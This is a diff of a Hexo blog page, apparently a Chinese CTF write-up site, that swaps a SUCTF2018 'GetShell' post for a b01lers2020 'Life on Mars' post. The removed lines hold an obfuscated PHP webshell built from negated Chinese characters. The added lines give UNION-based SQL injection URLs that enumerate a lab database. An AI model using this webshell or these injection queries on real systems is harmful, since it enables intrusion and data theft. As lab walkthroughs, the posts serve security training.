@@ -13,7 +13,7 @@
 
 
 
-<title>[suctf2018]GetShell | Hexo</title>
+<title>[b01lers2020]lifeMars | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">[suctf2018]GetShell</h1>
+            <h1 class="post-title">[b01lers2020]lifeMars</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">June 19, 2024&nbsp;&nbsp;21:42:44</a>
+                        Date: <a href="#">June 20, 2024&nbsp;&nbsp;20:21:48</a>
                         </span>
                     
                     
@@ -221,17 +221,32 @@
         </header>
 
         <div class="post-content">
-            <h2 id="suctf2018-GetShell"><a href="#suctf2018-GetShell" class="headerlink" title="[suctf2018]GetShell"></a>[suctf2018]GetShell</h2><p>参考p神利用取反来获取可用字符：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$a = ~垂;</span><br><span class="line">echo $a.&quot;\n&quot;;</span><br><span class="line">echo $a[1];</span><br><span class="line">/*</span><br><span class="line">运行得：</span><br><span class="line">a&#125;</span><br><span class="line">a</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+            <p><img src="/../images/%5Bb01lers2020%5DLifeOnMars/2.png" alt="2"></p>
+<p>进来是这样的场景：用f12进入网络发现有些一样的传参：</p>
+<p><img src="/../images/%5Bb01lers2020%5DLifeOnMars/3.png" alt="3"></p>
+<p>发现有个search的传参：（结合源码（ctrl+u）发现有个life on mars这个文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">life on mars.js</span><br><span class="line"></span><br><span class="line">function get_life(query) &#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    type: &quot;GET&quot;,</span><br><span class="line">    url: &quot;/query?search=&quot; + query,</span><br><span class="line">    data: &quot;&#123;&#125;&quot;,</span><br><span class="line">    contentType: &quot;application/json; charset=utf-8&quot;,</span><br><span class="line">    dataType: &quot;json&quot;,</span><br><span class="line">    cache: false,</span><br><span class="line">    success: function(data) &#123;</span><br><span class="line">      var table_html =</span><br><span class="line">        &#x27;&lt;table id=&quot;results&quot;&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">      $.each(data, function(i, item) &#123;</span><br><span class="line">        table_html +=</span><br><span class="line">          &quot;&lt;tr&gt;&lt;td&gt;&quot; + data[i][0] + &quot;&lt;/td&gt;&lt;td&gt;&quot; + data[i][1] + &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br><span class="line">      &#125;);</span><br><span class="line">      table_html += &quot;&lt;/table&gt;&quot;;</span><br><span class="line"></span><br><span class="line">      $(&quot;#results&quot;).replaceWith(table_html);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    error: function(msg) &#123; &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>🐎一下汉字：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">echo ~茉**[**$____**]**;//s</span><br><span class="line"></span><br><span class="line">echo ~内**[**$____**]**;//y</span><br><span class="line"></span><br><span class="line">echo ~茉**[**$____**]**;//s</span><br><span class="line"></span><br><span class="line">echo ~苏**[**$____**]**;//t</span><br><span class="line"></span><br><span class="line">echo ~的**[**$____**]**;//e</span><br><span class="line"></span><br><span class="line">echo ~咩**[**$____**]**;//m</span><br><span class="line"></span><br><span class="line">echo ~课**[**$____**]**;//P</span><br><span class="line"></span><br><span class="line">echo ~尬**[**$____**]**;//O</span><br><span class="line"></span><br><span class="line">echo ~笔**[**$____**]**;//S</span><br><span class="line"></span><br><span class="line">echo ~端**[**$____**]**;//T</span><br><span class="line"></span><br><span class="line">echo ~瞎**[**$____**]**;//a</span><br></pre></td></tr></table></figure>
+<p>该js文件返回的是数据集，那么这里一定查询了数据库，那么就可能存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">sql注入漏洞</a>。那就开始sql注入的流程。</p>
+<p><code>/query?search=</code>如果地名输入正确，发现返回如下:</p>
+<p><img src="/../images/%5Bb01lers2020%5DLifeOnMars/4.png" alt="4"></p>
+<p>开始SQL注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有几个字段：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum order by 2</span><br><span class="line">查询数据库名称：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,database()</span><br><span class="line">查询数据表：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20=%20%27aliens%27)</span><br></pre></td></tr></table></figure>
 
-<p>构成🐎，POST参数a：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>
+<p>到这里就搞不出来了：然后就是</p>
+<h4 id="查询所有的数据库"><a href="#查询所有的数据库" class="headerlink" title="查询所有的数据库"></a>查询所有的数据库</h4><p>在这个查询中，information_schema.schemata是一个MySQL系统表，其中包含所有数据库的信息。执行这个查询后，MySQL将返回一个包含所有数据库名称的结果集。</p>
+<p>这些命令和查询可以在MySQL命令行界面中使用，也可以在MySQL客户端或其他数据库工具中使用。</p>
+<p><a target="_blank" rel="noopener" href="http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum%20union%20select%201,(SELECT%20group_concat(schema_name)%20FROM%20information_schema.schemata">http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum%20union%20select%201,(SELECT%20group_concat(schema_name)%20FROM%20information_schema.schemata</a>)</p>
+<p>还可以：（直接用sqlmap）：</p>
+<p><img src="/../images/%5Bb01lers2020%5DLifeOnMars/1.png" alt="1"></p>
+<p>爆出还有一个alien_code这个库：（重复上个的操作）</p>
+<p>或者可以：</p>
+<p><img src="/../images/%5Bb01lers2020%5DLifeOnMars/5.png" alt="5"></p>
+<p>直接有字段名了：</p>
+<p>没有直接给出就手打：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=amazonis_planitia%20union%20select%20group_concat(id),group_concat(code)%20from%20alien_code.code</span><br></pre></td></tr></table></figure>
 
-<p>![1](..&#x2F;images&#x2F;[SUCTF 2018]GetShell&#x2F;1.png)</p>
-<h4 id="用env访问环境变量获得flag："><a href="#用env访问环境变量获得flag：" class="headerlink" title="用env访问环境变量获得flag："></a>用env访问环境变量获得flag：</h4><p>参考自：<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1856.html">https://www.shawroot.cc/1856.html</a></p>
+<p>完成，获得flag</p>
 
         </div>
 
@@ -246,7 +261,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/06/19/2018-GetShell/">http://odiws.github.io/2024/06/19/2018-GetShell/</a></span>
+                        <span><a href="http://odiws.github.io/2024/06/20/Mars/">http://odiws.github.io/2024/06/20/Mars/</a></span>
                     </p>
                 
                 
@@ -272,7 +287,9 @@
                     
                         <a href="/tags/buuctf/"># buuctf</a>
                     
-                        <a href="/tags/%E6%96%87%E4%BB%B6%E5%86%85%E6%97%A0%E5%AD%97%E7%AC%A6rce/"># 文件内无字符rce</a>
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/"># sql注入</a>
+                    
+                        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88js%EF%BC%8C%E7%BD%91%E7%BB%9C%EF%BC%89/"># 信息搜集（js，网络）</a>
                     
                         
                 </span>
@@ -285,10 +302,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/06/20/Mars/">[b01lers2020]lifeMars</a>
             
-            
-            <a class="next" rel="next" href="/2024/06/19/HFCTF2020-JustEscape/">[HFCTF2020]JustEscape</a>
+            <a class="next" rel="next" href="/2024/06/19/2018-GetShell/">[suctf2018]GetShell</a>
             
         </section>
 
